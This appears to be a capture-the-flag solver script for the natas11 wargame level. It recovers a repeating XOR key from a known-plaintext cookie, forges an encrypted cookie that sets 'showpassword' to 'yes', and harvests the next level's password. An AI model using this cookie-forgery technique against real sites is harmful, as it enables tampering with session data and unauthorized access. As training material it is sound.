"""
natas11: weakly-encrypted, unsigned cookie data
"""

import base64
import itertools
import requests
import urllib.parse
from natas_utils import *
from typing import Optional

LEVEL = 11
URL, LOGIN = load_level(LEVEL)

def detect_key(data: bytes, min_length: int = 1) -> Optional[bytes]:
    """
    Greedy, naive repeated XOR key detection.
    """
    for keylen in range(min_length, len(data) // 2):
        for i in range(len(data) -  2 * keylen):
            if data[i:(i + keylen)] == data[(i + keylen):(i + 2 * keylen)]:
                return bytes(data[i:(i + keylen)])
    return None

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([d ^ k for d, k in zip(data, itertools.cycle(key))])

def main():
    leaked_defaultdata = b'{"showpassword":"no","bgcolor":"#FFFFFF"}'
    payload_data = b'{"showpassword":"yes","bgcolor":"#FFFFFF"}'

    with requests.session() as session:
        _ = session.get(URL, auth=LOGIN)

        # get XOR-encrypted cookie
        encrypted_cookie = base64.b64decode(urllib.parse.unquote(session.cookies.get("data")))

        xor_result = bytes([a ^ b for a, b in zip(leaked_defaultdata, encrypted_cookie)])

        key = detect_key(xor_result)
        if not key:
            exit("failed to extract XOR key")

        # encrypt payload with the server's key
        encrypted_payload = xor_encrypt(payload_data, key)
        # need to base-64 and URL encode the encrypted payload
        payload = urllib.parse.quote(base64.b64encode(encrypted_payload))

        session.cookies.set("data", payload)

        response = session.get(URL, auth=LOGIN)

    candidate_passwords = extract_candidate_passwords(response.text)
    natas12_password = try_level_login(LEVEL + 1, candidate_passwords)

    if natas12_password:
        print("natas12:", natas12_password)
        store_level_password(LEVEL + 1, natas12_password)
    else:
        exit("Failed to get password for the next level.")

if __name__ == "__main__":
    main()